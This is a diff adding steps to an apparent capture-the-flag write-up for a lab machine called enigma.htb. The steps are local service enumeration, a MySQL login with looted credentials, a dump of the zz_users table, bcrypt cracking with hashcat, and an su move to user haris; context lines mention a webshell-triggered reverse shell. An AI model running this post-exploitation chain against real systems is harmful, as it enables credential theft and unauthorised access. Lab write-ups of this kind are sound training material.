@@ -216,6 +216,33 @@ Then trigger the webshell to send a reverse shell back to us:
 Once the connection lands, we upgrade to a fully interactive TTY:  
 ``` python3 -c 'import pty; pty.spawn("/bin/bash")' ```
 
+### Internal Service Enumeration
+With a foothold on the box, we check for locally bound services that aren't exposed externally:  
+```
+ss -tulnp
+
+Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:PortProcess                                                                                                     
+tcp   LISTEN 0      100          0.0.0.0:995        0.0.0.0:*                                                           
+tcp   LISTEN 0      100          0.0.0.0:993        0.0.0.0:*                                                           
+tcp   LISTEN 0      4096         0.0.0.0:39479      0.0.0.0:*                                                           
+tcp   LISTEN 0      4096      127.0.0.54:53         0.0.0.0:*                                                           
+tcp   LISTEN 0      100        127.0.0.1:25         0.0.0.0:*                                                           
+tcp   LISTEN 0      4096         0.0.0.0:111        0.0.0.0:*                                                           
+tcp   LISTEN 0      100          0.0.0.0:110        0.0.0.0:*                                                           
+tcp   LISTEN 0      511          0.0.0.0:80         0.0.0.0:*    users:(("nginx",pid=1555,fd=5),("nginx",pid=1554,fd=5))
+tcp   LISTEN 0      64           0.0.0.0:2049       0.0.0.0:*                                                           
+tcp   LISTEN 0      4096         0.0.0.0:22         0.0.0.0:*                                                           
+tcp   LISTEN 0      70         127.0.0.1:33060      0.0.0.0:*                                                           
+tcp   LISTEN 0      4096   127.0.0.53%lo:53         0.0.0.0:*                                                           
+tcp   LISTEN 0      100          0.0.0.0:143        0.0.0.0:*                                                           
+tcp   LISTEN 0      4096         0.0.0.0:57219      0.0.0.0:*                                                           
+tcp   LISTEN 0      4096         0.0.0.0:46981      0.0.0.0:*                                                           
+tcp   LISTEN 0      151        127.0.0.1:3306       0.0.0.0:*                                                           
+tcp   LISTEN 0      4096         0.0.0.0:58783      0.0.0.0:*                                                           
+tcp   LISTEN 0      64           0.0.0.0:40183      0.0.0.0:*                                                           
+tcp   LISTEN 0      4096       127.0.0.1:1337       0.0.0.0:*                                                           
+```
+
 ### Loot: Database Credentials  
 Inspecting the application's configuration file, /var/www/html/openstamanager/config.inc.php, we find hardcoded database credentials:  
 ```
@@ -229,6 +256,75 @@ $db_options = [
     // 'sort_buffer_size' => '2M',
 ];
 ```
+### Accessing the Database  
+Using the database credentials recovered earlier from config.inc.php, we connect to the local MySQL instance:  
+```
+mysql -u <redacted> -p
+
+mysql> SHOW databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| openstamanager      |
+| performance_schema |
++--------------------+
+3 rows in set (0.00 sec)
+
+```
+We switch focus to the openstamanager database and list its tables:  
+```
+mysql> show tables;
+show tables;
+
+[...]
+| zz_users                        |
+[...]
+
+mysql> select * from zz_users;
+select * from zz_users;
++----+----------+--------------------------------------------------------------+------------------+--------------+----------+---------+---------------------+---------------------+---------+
+| id | username | password      | email            | idanagrafica | idgruppo | enabled | created_at          | updated_at          | reset_token | image_file_id | options |
++----+----------+--------------------------------------------------------------+------------------+--------------+----------+---------+---------------------+---------------------+---------+
+|  1 | admin    | <redacted>    | admin@enigma.htb |            1 |        1 |       1 | 2026-02-18 19:26:52 | 2026-02-18 19:26:52 | NULL        |          NULL |         |
+|  2 | haris    | <redacted>    | haris@enigma.htb |            1 |        5 |       1 | 2026-02-18 20:58:28 | 2026-05-26 11:07:03 | NULL        |          NULL |         |
++----+----------+--------------------------------------------------------------+------------------+--------------+----------+---------+---------------------+---------------------+---------+
+```
+### Identifying the Hash Format and Cracking tha Hash  
+The zz_users table contains a bcrypt-style password hash. We confirm the hash type with hashid:  
+```
+hashid -m '$2y$10$<redacted>'
+Analyzing '$2y$10$<redacted>'
+[+] Blowfish(OpenBSD) [Hashcat Mode: 3200]
+[+] Woltlab Burning Board 4.x
+[+] bcrypt [Hashcat Mode: 3200]
+```
+This confirms it's a bcrypt hash, crackable with Hashcat mode 3200.  
+Running the hash through Hashcat against a wordlist (e.g. rockyou.txt), and then retrieving the cracked result:  
+```
+hashcat -m 3200 hash.txt --show
+$2y$10$<redacted>:<redacted>
+```
+The crack succeeds, giving us a plaintext password.  
+### Lateral Movement to a System User
+Since the cracked hash belongs to a user named <redacted in the zz_users table, we try the cracked plaintext password against the corresponding local system account:  
+```
+su <redacted>
+Password: <redacted>
+```
+The login succeeds, giving us a shell as the local user haris.  
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
